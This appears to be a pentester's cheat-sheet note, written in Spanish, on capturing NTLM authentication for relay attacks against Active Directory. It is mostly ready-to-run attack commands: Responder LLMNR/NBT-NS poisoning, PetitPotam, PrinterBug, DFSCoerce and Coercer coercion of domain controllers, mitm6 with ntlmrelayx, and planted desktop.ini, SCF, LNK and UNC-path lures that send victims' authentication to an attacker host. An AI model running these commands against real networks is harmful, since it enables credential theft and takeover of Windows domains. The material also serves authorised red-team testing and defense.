---
aliases:
  - NTLM Relay Capture
tags:
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NTLM Relay]]"
  - "[[Responder]]"
  - "[[Authentication Coercion]]"
---
# NTLM Relay - Captura de Auth

> Primero hay que conseguir que una víctima (usuario o computer account) autentique contra vos. Cuatro vías.

---

## LLMNR / NBT-NS / mDNS Poisoning

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `sudo responder -I eth0 -wv` | Responde a name resolution → captura Net-NTLMv2 | Captura para crackear. |
| `sudo responder -I eth0 -v -wFb` | Modo **relay** (no responde challenge, lo forwarda) | Para usar con ntlmrelayx (desactiva SMB/HTTP internos). |
| `responder -I eth0 -A` | Analyze mode (solo escucha, no envenena) | Recon sin ruido → [[Responder]]. |
^ntlmrelay-capture-llmnr

## Coerción (fuerza auth de computer accounts)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `PetitPotam.py -u '' -p '' $ATTACKER $DC` | Coerce el DC vía MS-EFSRPC (pre-parche, sin auth) | ESC8 / relay del DC → [[Authentication Coercion]]. |
| `printerbug.py corp.local/user:pass@$DC $ATTACKER` | Coerce vía MS-RPRN (PrinterBug) | Spooler activo. |
| `dfscoerce.py -u user -p pass $ATTACKER $DC` | Coerce vía MS-DFSNM | Si PetitPotam parcheado. |
| `coercer coerce -l $ATTACKER -t $TARGET -u user -p pass` | Wrapper que prueba todos los métodos | Auto. |
^ntlmrelay-capture-coerce

## Intranet Tricks (forzar auth de usuarios)

| **Vector** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| UNC path `file://attacker/share` en doc Office / email | Auth del usuario al abrir | Phishing interno. |
| SCF file dropped en un share | Trigger automático en Explorer | Share escribible. |
| `desktop.ini` con `IconFile=\\attacker\evil.ico` | Auth al navegar la carpeta | Share escribible. |
| LNK con icono UNC | Auth al renderizar el ícono | Drop en share/Desktop. |
^ntlmrelay-capture-intranet

## WPAD / IPv6 Takeover (mitm6)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `mitm6 -d corp.local` | DHCPv6 takeover + DNS → WPAD spoof | IPv6 habilitado (default). |
| `ntlmrelayx.py -6 -wh fake-wpad.corp.local -t ldaps://$DC --delegate-access` | Relay con WPAD spoofeado | En paralelo a mitm6 → [[mitm6 - IPv6 DHCP Spoofing]]. |
^ntlmrelay-capture-mitm6

> Capturada la auth, relayar al target: [[NTLM Relay - Relay Targets]].
